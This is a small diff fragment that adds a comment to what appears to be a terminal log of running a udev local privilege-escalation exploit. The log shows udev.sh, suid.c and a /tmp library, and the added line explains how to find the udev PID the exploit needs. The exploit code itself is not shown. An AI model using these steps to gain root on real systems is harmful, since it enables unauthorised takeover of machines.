@@ -232,6 +232,7 @@ chmod 755 udev.sh
 sh: line 4: syntax error near unexpected token `newline'
 sh: line 4: `!'
 sh-3.2$ ./udev.sh 402
+* note: this exploit needs the PID of the udev process. It is 402 in my case. find with cat /proc/net/netlink or something *
 suid.c: In function 'main':
 suid.c:3: warning: incompatible implicit declaration of built-in function 'execl'
 cp: `libno_ex.so.1.0' and `/tmp/libno_ex.so.1.0' are the same file
